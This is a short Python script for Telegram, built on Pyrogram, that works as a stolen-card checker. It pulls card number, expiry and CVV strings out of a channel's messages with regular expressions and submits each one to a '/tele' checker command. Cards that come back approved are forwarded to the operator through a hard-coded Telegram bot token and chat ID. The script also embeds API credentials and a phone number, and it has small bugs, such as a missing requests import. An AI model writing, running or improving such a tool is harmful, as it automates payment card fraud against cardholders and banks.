import os
import time
import random
import re
from pyrogram import Client, filters

Z = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'

api_id = "18189325"
api_hash = "7cb3b3ea70ba49f0721a511013eefe53"
phone_number = "201011234195"
ch = "https://t.me/Professor_Ashu"
ID = "5276901951"
token = "5276901951:AAGk3pN8m7CX62I5G4WReam27Cc4FZ3bCpo"

async def fetch_cards_from_channel():
    app = Client("session", api_id, api_hash)
    await app.start()

    entity = await app.resolve_peer(ch)
    channel = entity.input_channel

    messages = await app.get_chat_history(channel, limit=2000)

    card_regex = r"\d{16}\ \d{2}\/\d{2}\ \d{3}"
    card_regex2 = r"\d{16}\|\d{2}\|\d{4}\|\d{3}"

    for message in reversed(messages):
        if message.text:
            matches = re.findall(card_regex, message.text) or re.findall(card_regex2, message.text)
            for match in matches:
                await process_card(app, match)

    await app.stop()

async def process_card(app, cc):
    try:
        await app.send_message(ch, f"/tele {cc}")
        time.sleep(random.randint(26, 27))
        messages = await app.get_chat_history(ch, limit=1)
        ccn = messages[0].text
        print(ccn)
        if "APPROVED" in ccn:
            print(F + f'Approved✅{ccn}.')
            mgs = f'''𝙽𝙴𝚆 𝚅𝙸𝚂𝙰 💸𝙷𝚞𝙽𝚃𝙴𝙳❤️💥.
{ccn}.

━━━━━━━━━━━━━━━
𝗖𝗛𝗘𝗞𝗘𝗗 𝗕𝗬"@T4_Mohamed ✨🤍 '''
            tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={mgs}"
            i = requests.post(tlg)
            time.sleep(1)
        else:
            print(Z + 'Declined❌')
    except Exception as e:
        print(False)
        os.system('clear')
        print("New message:", ccn)
        print(str(e))

await fetch_cards_from_channel()
